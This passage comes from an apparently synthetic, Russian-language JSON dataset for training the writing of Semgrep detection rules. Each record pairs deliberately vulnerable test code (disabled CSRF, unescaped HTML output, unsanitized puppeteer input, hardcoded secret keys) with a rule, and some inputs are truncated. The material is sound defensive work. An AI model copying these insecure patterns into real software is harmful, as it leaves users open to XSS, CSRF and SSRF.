pattern-either:\n      - patterns:\n        - pattern-inside: |\n            function(..., $SCOPE, ...) { ... }\n        - focus-metavariable: $SCOPE\n        - metavariable-regex:\n            metavariable: $SCOPE\n            regex: ^\\$scope$\n      - pattern: $rootScope\n      - pattern: $injector.get('$rootScope')\n      - pattern: $injector.get('$scope')\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          angular.element(...). ... .$SINK($QUERY)\n      - pattern-inside: |\n          $ANGULAR = angular.element(...)\n          ...\n          $ANGULAR. ... .$SINK($QUERY)\n    - metavariable-regex:\n        metavariable: $SINK\n        regex: ^(after|append|html|prepend|replaceWith|wrap)$\n    - focus-metavariable: $QUERY\n  pattern-sanitizers:\n  - patterns:\n    - pattern-either:\n      - pattern: $sce.getTrustedHtml(...)\n      - pattern: $sanitize(...)\n      - pattern: DOMPurify.sanitize(...)\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода angular.element в AngularJS, который может привести к XSS-уязвимостям, если пользовательский ввод не был должным образом экранирован или очищен перед вставкой в HTML-элемент ($SINK). Источниками считаются переменные, начинающиеся с \\$rootScope или \\$scope, а sinkами являются методы angular.element, принимающие HTML-текст и изменяющие содержимое DOM-элемента. Правило также учитывает функции sanitизации, такие как sce.getTrustedHtml и sanitize, которые должны использоваться для предотвращения XSS.\n\n# Ключевые элементы:\n- ID: detect-angular-element-methods\n- Язык: javascript \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-angular-element-methods",
      "language": "javascript",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения flask-wtf-csrf-disabled\nОписание уязвимости: Setting 'WTF_CSRF_ENABLED' to 'False' explicitly disables CSRF protection.\nCWE: CWE-352: Cross-Site Request Forgery (CSRF)\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-352: Cross-Site Request Forgery (CSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wtf-csrf-disabled.py\nimport flask\nfrom flask import response as r\n\napp = flask.Flask(__name__)\n# ruleid:flask-wtf-csrf-disabled\napp.config['WTF_CSRF_ENABLED'] = False\n\n# ruleid:flask-wtf-csrf-disabled\napp.config[\"WTF_CSRF_ENABLED\"] = False\n\n# ok: flask-wtf-csrf-disabled\napp.config[\"WTF_CSRF_ENABLED\"] = True\n# ok: flask-wtf-csrf-disabled\napp.config[\"SESSION_COOKIE_SECURE\"] = False\n\n# ruleid: flask-wtf-csrf-disabled\napp.config.WTF_CSRF_ENABLED = False\n# ok: flask-wtf-csrf-disabled\napp.config.WTF_CSRF_ENABLED = True\n\n# DICT UPDATE\n################\n\napp.config.update(\n    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',\n    # ruleid: flask-wtf-csrf-disabled\n    WTF_CSRF_ENABLED = False,\n    TESTING=False\n)\n\n# It's okay to do this during testing\napp.config.update(\n    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',\n    # ok: flask-wtf-csrf-disabled\n    WTF_CSRF_ENABLED = False,\n    TESTING=True\n)\n\n# FROM OBJECT\n################\n\n# custom class\nappconfig = MyAppConfig()\n# ruleid: flask-wtf-csrf-disabled\nappconfig.WTF_CSRF_ENABLED = False\n\napp.config.from_object(appconfig)\n\n# this file itself\nSECRET_KEY = 'development key'\n# ruleid: flask-wtf-csrf-disabled\nWTF_CSRF_ENABLED = False\n\napp.config.from_object(__name__)\n\n# FROM MAPPING\n################\n\napp.config.from_mapping(\n    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',\n    # ruleid: flask-wtf-csrf-disabled\n    WTF_CSRF_ENABLED = False,\n)\n\n# It's okay to do this during testing\napp.config.from_mapping(\n    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',\n    # ok: flask-wtf-csrf-disabled\n    WTF_CSRF_ENABLED = False,\n    TESTING=True\n)\n\n@app.route(\"/index\")\ndef index():\n    return 'hello world'\n\n\n// File: wtf-csrf-disabled.fixed.py\nimport flask\nfrom flask import response as r\n\napp = flask.Flask(__name__)\n# ruleid:flask-wtf-csrf-disabled\napp.config['WTF_CSRF_ENABLED'] = True\n\n# ruleid:flask-wt  # Ограничиваем длину\n\nОпасные паттерны:\n• app.config['WTF_CSRF_ENABLED'] = False\n• app.config.WTF_CSRF_ENABLED = False\n• app.config.update(WTF_CSRF_ENABLED = False)\n\nБезопасные паттерны:  \n• app.config['WTF_CSRF_ENABLED'] = True\n• app.config.WTF_CSRF_ENABLED = True\n• app.config.update(WTF_CSRF_ENABLED = True)\n\nЛегенда аннотаций:\n- // ruleid:flask-wtf-csrf-disabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:flask-wtf-csrf-disabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: flask-wtf-csrf-disabled\n  message: >-\n    Setting 'WTF_CSRF_ENABLED' to 'False' explicitly disables CSRF protection.\n  options:\n    symbolic_propagation: true\n  metadata:\n    cwe:\n    - 'CWE-352: Cross-Site Request Forgery (CSRF)'\n    owasp:\n    - A01:2021 - Broken Access Control\n    references:\n    - https://flask-wtf.readthedocs.io/en/1.2.x/csrf/\n    category: security\n    technology:\n    - flask\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n    functional-categories:\n    - web::search::csrf-config::flask\n    - web::search::csrf-config::flask-wtf\n  severity: WARNING\n  languages:\n  - python\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern: $APP.config[\"WTF_CSRF_ENABLED\"] = $FALSE\n        - pattern: $APP.config.WTF_CSRF_ENABLED = $FALSE\n        - patterns:\n          - pattern: |\n              $APP.config.$UPDATE(\n                ...,\n                WTF_CSRF_ENABLED = $FALSE,\n                ...\n              )\n          - pattern-not-inside: |\n              $APP.config.$UPDATE(\n                  ...,\n                  TESTING=True,\n                  ...\n              )\n          - pattern-not-inside: |\n              $APP.config.$UPDATE(\n                  ...,\n                  DEBUG=True,\n                  ...\n              )\n          - metavariable-regex:\n              metavariable: $UPDATE\n              regex: ^(update|from_mapping)$\n        - pattern: |\n            $OBJ = $CLASS()\n            ...\n            $OBJ.WTF_CSRF_ENABLED = $FALSE\n            ...\n            $APP.config.from_object($OBJ, ...)\n        - pattern: |\n            WTF_CSRF_ENABLED = $FALSE\n            ...\n            $APP.config.from_object(__name__)\n      - metavariable-regex:\n          metavariable: $FALSE\n          regex: ^(False)$\n      - focus-metavariable: $FALSE\n  fix: 'True'\n\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска явных установок параметра 'WTF_CSRF_ENABLED' равным False в конфигурации Flask-WTF приложения. Анализируются различные способы установки конфигурационных параметров, включая прямое присвоение переменной, обновление словаря конфигурации и загрузку настроек из объекта или файла. Правило также учитывает исключения, когда установка происходит во время тестирования или отладки.\n\n# Ключевые элементы:\n- ID: flask-wtf-csrf-disabled\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "flask-wtf-csrf-disabled",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения tempfile-insecure\nОписание уязвимости: Use tempfile.NamedTemporaryFile instead. From the official Python documentation: THIS FUNCTION IS UNSAFE AND SHOULD NOT BE USED. The file name may refer to a file that did not exist at some point, but by the time you get around to creating it, someone else may have beaten you to the punch.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: mktemp.py\nimport tempfile as tf\n\n# ruleid: tempfile-insecure\nx = tempfile.mktemp()\n# ruleid: tempfile-insecure\nx = tempfile.mktemp(dir=\"/tmp\")  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: mktemp.py\nimport tempfile as tf\nx = tf.mktemp()\n• // File: mktemp.py\nimport tempfile as tf\nx = tf.mktemp(dir=\"/tmp\")\n\nБезопасные паттерны:  \n• // File: temp.py\nimport tempfile as tf\ntmpfile = tf.NamedTemporaryFile(delete=True)\n• // File: secure_temp.py\nimport tempfile as tf\ntmpfile = tf.TemporaryFile(mode='w+')\n\nЛегенда аннотаций:\n- // ruleid:tempfile-insecure: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tempfile-insecure: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: tempfile-insecure\n    pattern: tempfile.mktemp(...)\n    message:\n      \"Use tempfile.NamedTemporaryFile instead. From the official Python documentation: THIS FUNCTION IS UNSAFE AND SHOULD\n      NOT BE USED. The file name may refer to a file that did not exist at some point, but by the time you get around to creating\n      it, someone else may have beaten you to the punch.\"\n    languages: [python]\n    severity: ERROR\n    metadata:\n      category: correctness\n      technology:\n        - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции mktemp из модуля tempfile в Python. Паттерн ищет любой вызов mktemp с произвольными аргументами. Примеры опасного кода демонстрируют неправильное использование mktemp, тогда как безопасный код использует NamedTemporaryFile вместо mktemp.\n\n# Ключевые элементы:\n- ID: tempfile-insecure\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tempfile-insecure",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения tofastproperties-code-execution\nОписание уязвимости: Potential arbitrary code execution, whatever is provided to `toFastProperties` is sent straight to eval()\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tofastproperties-code-execution.js\nimport * as Promise from \"bluebird\";\n\nfunction bad1(input) {\n// ruleid: tofastproperties-code-execution\n  util.toFastProperties(input);\n}\n\nfunction ok1() {\n// ok: tofastproperties-code-execution\n  util.toFastProperties(\"smth hardcoded\");\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: tofastproperties-code-execution\nutil.toFastProperties(input);\n• // ruleid: tofastproperties-code-execution\ntoFastProperties(userInput);\n\nБезопасные паттерны:  \n• // ok: tofastproperties-code-execution\nutil.toFastProperties('hardcodedValue');\n• // ok: tofastproperties-code-execution\ntoFastProperties('anotherHardcodedValue');\n\nЛегенда аннотаций:\n- // ruleid:tofastproperties-code-execution: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tofastproperties-code-execution: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tofastproperties-code-execution\n  message: >-\n    Potential arbitrary code execution, whatever is provided to `toFastProperties` is sent straight to\n    eval()\n  metadata:\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - bluebird\n    references:\n    - http://bluebirdjs.com/docs/getting-started.html\n    cwe2022-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-inside: function ... (..., $ARG,...) {...}\n    - focus-metavariable: $ARG\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: $UTIL.toFastProperties($SINK,...)\n      - pattern: toFastProperties($SINK,...)\n    - pattern-either:\n      - pattern-inside: |\n          $BB = require('bluebird');\n          ...\n      - pattern-inside: |\n          import 'bluebird';\n          ...\n    - focus-metavariable: $SINK\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей выполнения произвольного кода, связанных с использованием функции toFastProperties. Источниками (sources) являются аргументы функций, содержащиеся внутри шаблонов, таких как 'function ... ($ARG,...){...}'. Синки (sinks) определяются путем проверки вызовов toFastProperties или аналогичных методов, которые могут напрямую передавать данные в функцию eval(). Правило использует метапеременные $ARG и $SINK для отслеживания потенциально опасных аргументов и целей.\n\n# Ключевые элементы:\n- ID: tofastproperties-code-execution\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tofastproperties-code-execution",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: no-printf-in-responsewriter\nОписание уязвимости: Detected 'printf' or similar in 'http.ResponseWriter.write()'. This bypasses HTML escaping that prevents cross-site scripting vulnerabilities. Instead, use the 'html/template' package to render data to users.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: no-printf-in-responsewriter.go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc getMovieQuote() map[string]string {\n\tm := make(map[string]string)\n\tm[\"quote\"] = \"I'll be back.\"\n\tm[\"movie\"] = \"The Terminator\"\n\tm[\"year\"] = \"1984\"\n\n\treturn m\n}\n\nfunc indexPage(w http.ResponseWriter, r *http.Request) {\n    const tme = `<html>`\n\n\tconst template = `\n\t<html>\n\t<body>\n\t  <h1>Random Movie Quotes</h1>\n\t  <h2>%s</h2>\n\t  <h4>~%s, %s</h4>\n\t</body>\n\t</html>`\n\n\tquote := getMovieQuote()\n\n\tquoteText := quote[\"quote\"]\n\tmovie := quote[\"movie\"]\n\tyear := quote[\"year\"]\n\n\tw.WriteHeader(http.StatusAccepted)\n\t// ruleid: no-printf-in-responsewriter\n\tw.Write([]byte(fmt.Sprintf(template, quoteText, movie, year)))\n}\n\nfunc errorPage(w http.ResponseWriter, r *http.Request) {\n\tparams := r.URL.Query()\n\turls, ok := params[\"url\"]\n\tif !ok {\n\t\tlog.Println(\"Error\")\n\t\treturn\n\t}\n\turl := urls[0]\n\n    const template = `\n\t<html>\n\t<body>\n\t  <h1>error; page not found. <a href=\"%s\">go back</a></h1>\n\t</body>\n\t</html>`\n\n\tw.WriteHeader(http.StatusAccepted)\n\t// ruleid: no-printf-in-responsewriter\n\tw.Write([]byte(fmt.Sprintf(template, url)))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", indexPage)\n\thttp.HandleFunc(\"/error\", errorPage)\n\thttp.ListenAndServe(\":8080\", nil)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• w.Write([]byte(fmt.Sprintf(template, quoteText, movie, year)))\n• w.Write([]byte(fmt.Sprintf(template, url)))\n\nБезопасные паттерны:  \n• tmpl, err := template.New(\"template\").Parse(templateString)\nif err != nil {\n\tlog.Fatal(err)\n}\ntmpl.Execute(w, quote)\n• t, _ := template.ParseFiles(\"./index.html\")\nt.Execute(w, quote)\n\nЛегенда аннотаций:\n- // ruleid:no-printf-in-responsewriter: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:no-printf-in-responsewriter: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: no-printf-in-responsewriter\n  message: >-\n    Detected 'printf' or similar in 'http.ResponseWriter.write()'.\n    This bypasses HTML escaping that prevents cross-site scripting\n    vulnerabilities. Instead, use the 'html/template' package\n    to render data to users.\n  metadata:\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://blogtitle.github.io/robn-go-security-pearls-cross-site-scripting-xss/\n    category: security\n    technology:\n    - go\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  severity: WARNING\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        func $HANDLER(..., $WRITER http.ResponseWriter, ...) {\n          ...\n        }\n    - pattern-inside: |\n        func(..., $WRITER http.ResponseWriter, ...) {\n          ...\n        }\n  - pattern: |\n      $WRITER.Write(<... fmt.$PRINTF(...) ...>, ...)\n  languages:\n  - go\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функций форматирования вывода, таких как 'fmt.Printf', внутри метода 'Write' объекта типа 'http.ResponseWriter'. Такое использование может привести к обходу механизмов HTML-экранинга, которые предотвращают межсайтовый скриптинг (XSS). Правило использует шаблон 'pattern-either' для проверки наличия функции 'Write' в контексте методов, принимающих аргумент типа 'http.ResponseWriter'. Затем оно применяет шаблон 'pattern' для выявления вызовов функций форматирования вывода, передающих результат непосредственно методу 'Write'. Это позволяет обнаружить потенциальную угрозу XSS при прямом выводе неподготовленного пользовательского ввода.\n\n# Ключевые элементы:\n- ID: no-printf-in-responsewriter\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "no-printf-in-responsewriter",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения security-constraint-http-method\nОписание уязвимости: The tag \"http-method\" is used to specify on which HTTP methods the java web security constraint apply. The target security constraints could be bypassed if a non listed HTTP method is used. Inverse the logic by using the tag \"http-method-omission\" to define for which HTTP methods the security constraint do not apply. Using this way, only expected allowed HTTP methods will be skipped by the security constraint.\nCWE: CWE-863: Incorrect Authorization\nТип анализа: search\nЯзык: xml",
    "input": "Требования:\n- Язык: xml\n- Тип анализа: search\n- CWE: CWE-863: Incorrect Authorization\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: security-constraint-http-method.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n\n    <display-name>My Secure Web Application</display-name>\n\n    <servlet>\n        <servlet-name>HomeServlet</servlet-name>\n        <servlet-class>com.example.servlet.HomeServlet</servlet-class>\n        <init-param>\n            <param-name>welcomeMessage</param-name>\n            <param-value>Welcome to our application!</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet>\n        <servlet-name>ProductServlet</servlet-name>\n        <servlet-class>com.example.servlet.ProductServlet</servlet-class>\n        <init-param>\n            <param-name>productServiceUrl</param-name>\n            <param-value>http://api.example.com/products</param-value>\n        </init-param>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>HomeServlet</servlet-name>\n        <url-pattern>/home</url-pattern>\n        <url-pattern>/</url-pattern> </servlet-mapping>\n\n    <servlet-mapping>\n        <servlet-name>ProductServlet</servlet-name>\n        <url-pattern>/products/*</url-pattern> </servlet-mapping>\n\n    <filter>\n        <filter-name>LoggingFilter</filter-name>\n        <filter-class>com.example.filter.LoggingFilter</filter-class>\n        <init-param>\n            <param-name>logLevel</param-name>\n            <param-value>INFO</param-value>\n        </init-param>\n    </filter>\n\n    <filter>\n        <filter-name>AuthenticationFilter</filter-name>\n        <filter-class>com.example.filter.AuthenticationFilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>LoggingFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n        <dispatcher>REQUEST</dispatcher>\n        <dispatche  # Ограничиваем длину\n\nОпасные паттерны:\n• <web-app><security-constraint><web-resource-collection><http-method>GET</http-method></web-resource-collection></security-constraint></web-app>\n• <web-app><security-constraint><web-resource-collection><http-method>POST</http-method></web-resource-collection></security-constraint></web-app>\n\nБезопасные паттерны:  \n• <web-app><security-constraint><web-resource-collection><http-method-omission>HEAD</http-method-omission></web-resource-collection></security-constraint></web-app>\n• <web-app><security-constraint><web-resource-collection><http-method-omission>OPTIONS</http-method-omission></web-resource-collection></security-constraint></web-app>\n\nЛегенда аннотаций:\n- // ruleid:security-constraint-http-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:security-constraint-http-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: security-constraint-http-method\n    languages:\n      - xml\n    severity: WARNING\n    message: >-\n      The tag \"http-method\" is used to specify on which HTTP methods the java web security constraint apply.\n      The target security constraints could be bypassed if a non listed HTTP method is used.\n      Inverse the logic by using the tag \"http-method-omission\" to define for which HTTP methods the security constraint do not apply.\n      Using this way, only expected allowed HTTP methods will be skipped by the security constraint.\n    pattern: <http-method>$X</http-method>\n    paths:\n      include:\n        - \"**/web.xml\"\n    metadata:\n      category: security\n      owasp:\n        - A05:2021 Security Misconfiguration\n        - A01:2021 Broken Access Control\n      technology:\n        - java\n      references:\n        - https://docs.oracle.com/javaee/7/tutorial/security-webtier002.htm\n        - https://jakarta.ee/learn/docs/jakartaee-tutorial/current/security/security-advanced/security-advanced.html#_securing_http_resources\n      cwe:\n        - \"CWE-863: Incorrect Authorization\"\n      likelihood: LOW\n      impact: LOW\n      confidence: LOW\n      subcategory:\n        - audit\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования тега <http-method> в XML-файле конфигурации веб-приложения Java EE или Jakarta EE. Использование этого тега позволяет указать конкретные методы HTTP, на которые распространяются ограничения безопасности. Если не перечислены все допустимые методы HTTP, злоумышленник может обойти ограничение безопасности, используя неподдерживаемый метод HTTP. Правило ищет наличие тега <http-method>, который потенциально может привести к недостатку безопасности.\n\n# Ключевые элементы:\n- ID: security-constraint-http-method\n- Язык: xml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "security-constraint-http-method",
      "language": "xml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения puppeteer-setcontent-injection\nОписание уязвимости: If unverified user data can reach the `setContent` method it can result in Server-Side Request Forgery vulnerabilities\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: puppeteer-setcontent-injection.js\nconst puppeteer = require('puppeteer');\n\n(async () => {\n  const browser = await puppeteer.launch();\n  const page = await browser.newPage();\n\n// ok\n  await page.setContent('<html></html>');\n\n  // ruleid:puppeteer-setcontent-injection\n  await page.setContent(unverifiedInput());\n\n  await page.screenshot({path: 'example.png'});\n  await browser.close();\n})();  # Ограничиваем длину\n\nОпасные паттерны:\n• await page.setContent(unverifiedInput());\n• await page.setContent(userProvidedData);\n\nБезопасные паттерны:  \n• await page.setContent('<html></html>');\n• var input = \"<html></html>\"; await page.setContent(input);\n\nЛегенда аннотаций:\n- // ruleid:puppeteer-setcontent-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:puppeteer-setcontent-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: puppeteer-setcontent-injection\n  message: >-\n    If unverified user data can reach the `setContent` method it can result in Server-Side Request Forgery\n    vulnerabilities\n  metadata:\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    category: security\n    technology:\n    - puppeteer\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      require('puppeteer');\n      ...\n  - pattern-not-inside: |\n      require('puppeteer');\n      ...\n      var $INPUT = \"...\";\n      ...\n  - pattern: $PAGE.setContent($INPUT,...)\n  - pattern-not: $PAGE.setContent(\"...\",...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода setContent в библиотеке puppeteer, где входные данные ($INPUT) не проверены перед передачей. Паттерн сначала ищет присутствие библиотеки puppeteer через оператор pattern-inside, затем исключает случаи, когда переменная $INPUT явно инициализирована строкой ('pattern-not-inside'). Далее непосредственно проверяется вызов метода setContent с использованием метапеременной $PAGE и $INPUT. Правило также исключает ситуации, когда метод вызывается с жестко заданной строкой ('pattern-not').\n\n# Ключевые элементы:\n- ID: puppeteer-setcontent-injection\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "puppeteer-setcontent-injection",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: aws-emr-encrypted-with-cmk\nОписание уязвимости: Ensure EMR is encrypted at rest using KMS CMKs. CMKs gives you control over the encryption key in terms of access and rotation.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-emr-encrypted-with-cmk.tf\nresource \"aws_emr_security_configuration\" \"fail\" {\n  name = \"fail\"\n\n  # ruleid: aws-emr-encrypted-with-cmk\n  configuration = <<EOF\n{\n  \"EncryptionConfiguration\": {\n    \"EnableAtRestEncryption\": true,\n    \"AtRestEncryptionConfiguration\": {\n      \"S3EncryptionConfiguration\": {\n        \"EncryptionMode\": \"SSE-S3\"\n      },\n      \"LocalDiskEncryptionConfiguration\": {\n        \"EncryptionKeyProviderType\": \"AwsS3\"\n      }\n    }\n  }\n}\nEOF\n}\n\n\nresource \"aws_emr_security_configuration\" \"pass\" {\n  name = \"pass\"\n\n  configuration = <<EOF\n{\n  \"EncryptionConfiguration\": {\n    \"EnableAtRestEncryption\": true,\n    \"AtRestEncryptionConfiguration\": {\n      \"S3EncryptionConfiguration\": {\n        \"EncryptionMode\": \"SSE-KMS\",\n        \"AwsKmsKey\": \"${module.encryption_module.kms_key_alias}\"\n      },\n      \"LocalDiskEncryptionConfiguration\": {\n        \"EncryptionKeyProviderType\": \"AwsKms\",\n        \"AwsKmsKey\": \"${module.encryption_module.kms_key_alias}\"\n      }\n    },\n    \"EnableInTransitEncryption\": true\n  }\n}\nEOF\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_emr_security_configuration\" \"fail\" { ... configuration = <<EOF { \"EncryptionConfiguration\": { \"EnableAtRestEncryption\": true, \"AtRestEncryptionConfiguration\": { \"S3EncryptionConfiguratio\n• resource \"aws_emr_security_configuration\" \"another-failure\" { ... configuration = <<EOF { \"EncryptionConfiguration\": { \"EnableAtRestEncryption\": true, \"AtRestEncryptionConfiguration\": { \"S3EncryptionC\n\nБезопасные паттерны:  \n• resource \"aws_emr_security_configuration\" \"pass\" { ... configuration = <<EOF { \"EncryptionConfiguration\": { \"EnableAtRestEncryption\": true, \"AtRestEncryptionConfiguration\": { \"S3EncryptionConfiguratio\n• resource \"aws_emr_security_configuration\" \"correct-configuration\" { ... configuration = <<EOF { \"EncryptionConfiguration\": { \"EnableAtRestEncryption\": true, \"AtRestEncryptionConfiguration\": { \"S3Encry\n\nЛегенда аннотаций:\n- // ruleid:aws-emr-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-emr-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-emr-encrypted-with-cmk\n  patterns:\n  - pattern-inside: |\n      resource \"aws_emr_security_configuration\" $ANYTHING {\n        ...\n      }\n  - pattern: configuration = \"$STATEMENT\"\n  - metavariable-pattern:\n      metavariable: $STATEMENT\n      language: json\n      patterns:\n      - pattern-not-inside: |\n          \"AwsKmsKey\": ...\n  message: >-\n    Ensure EMR is encrypted at rest using KMS CMKs. CMKs gives you control over the encryption key in\n    terms of access and rotation.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций AWS EMR Security Configuration, которые не используют шифрование на основе CMK (Customer Managed Key) от KMS. В первом примере шифрование включено, но используется SSE-S3 или SSE-AWS вместо SSE-KMS, что является уязвимостью. Во втором примере шифрование настроено корректно с использованием SSE-KMS и привязкой к конкретному CMK, что безопасно.\n\n# Ключевые элементы:\n- ID: aws-emr-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
